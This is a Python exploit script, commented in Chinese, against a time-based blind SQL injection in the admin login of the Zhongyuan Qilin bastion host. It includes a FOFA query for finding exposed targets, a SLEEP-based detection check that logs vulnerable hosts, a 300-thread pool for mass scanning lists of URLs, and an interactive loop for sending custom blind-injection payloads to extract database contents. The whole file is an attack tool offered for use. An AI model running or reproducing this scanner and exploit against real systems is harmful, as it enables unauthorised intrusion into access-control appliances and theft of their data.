# FOFA：cert.subject="Baolei"
import requests,argparse,time,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings() # 解除警告
GREEN = '\033[92m' #输出颜色
RESET = '\033[0m'
proxies = { 
       "http": "http://127.0.0.1:8080", 
       "https": "http://127.0.0.1:8080" 
       }
def banner():
	banner = """

	██████╗██╗  ██╗ ██████╗ ███████╗███████╗███╗   ██╗ ██╗
██╔════╝██║  ██║██╔═══██╗██╔════╝██╔════╝████╗  ██║███║
██║     ███████║██║   ██║███████╗█████╗  ██╔██╗ ██║╚██║
██║     ██╔══██║██║   ██║╚════██║██╔══╝  ██║╚██╗██║ ██║
╚██████╗██║  ██║╚██████╔╝███████║███████╗██║ ╚████║ ██║
 ╚═════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═══╝ ╚═╝
                                     info:中远麒麟堡垒机存在SQL注入
	"""
	print(banner)
def poc(target):
	payload_url = "/admin.php?controller=admin_commonuser"
	url = target + payload_url
	headers={
		'Content-Type': 'application/x-www-form-urlencoded',
	}
	data="username=admin' AND (SELECT 12 FROM (SELECT(SLEEP(5)))ptGN) AND 'AAdm'='AAdm"
	
	try:
		res = requests.get(url=target,verify=False)
		# time = str(res1.elapsed.total_seconds())[0]
		# elapsed.total_seconds() 是一个 Python 中用于时间间隔对象,它返回时间间隔的总秒数。
		if res.status_code == 200:
			res1 = requests.post(url=url,headers=headers,data=data,verify=False)
			res2 = requests.post(url=url,headers=headers,verify=False)
			time1 = res1.elapsed.total_seconds()
			time2 = res2.elapsed.total_seconds()
			if time1 - time2 >=4:
				print(f"{GREEN}[+]该url存在SQL注入漏洞：{target}{RESET}")
				with open("result.txt","a",encoding="utf-8") as f:
					f.write(target+"\n")
				return True
			else:
				print(f"[-]该url不存在SQL注入漏洞：{target}")
				return False
		else:
			print(f"该url连接失败：{target}")
	except Exception as e:
		print(f"[*]该url出现错误：{target}")

def exp(target):
	print("-----------------------正在进行漏洞利用-------------------------------")
	time.sleep(2)
	payload_url = "/admin.php?controller=admin_commonuser"
	url = target + payload_url
	headers={
		'Content-Type': 'application/x-www-form-urlencoded'
	}

	while True:
		print(f"如：username=admin' AND if( length(database())=9,sleep(5),sleep(0)) AND 'AAdm'='AAdm")
		code = input("请输入执行的命令：(输入q退出)")
		if code == "q":
			break
		else:
			data = f"{code}"
			print(data)
			res1 = requests.post(url=url,headers=headers,data=data,verify=False)
			res2 = requests.post(url=url,headers=headers,verify=False)
			time1 = res1.elapsed.total_seconds()
			time2 = res2.elapsed.total_seconds()
			if time1 - time2 >=4:
				print(f"[+]正确，延时5秒")
				continue
			else:
				print(f"[-]错误")

def main():
	banner()
	parser = argparse.ArgumentParser()
	parser.add_argument("-u","--url",dest="url",type=str,help="please write link")
	parser.add_argument("-f","--file",dest="file",type=str,help="please write file\'path")
	args = parser.parse_args()
	if args.url and not args.file:
		if poc(args.url):
			exp(args.url)
	elif args.file and not args.url:
		url_list = []
		with open(args.file,"r",encoding="utf-8") as f:
			for i in f.readlines():
				url_list.append(i.strip().replace("\n",""))
		mp = Pool(300)
		mp.map(poc,url_list)
		mp.close()
		mp.join()
	else:
		print(f"\n\tUage:python {sys.argv[0]} -h")


if __name__ == "__main__":
	main()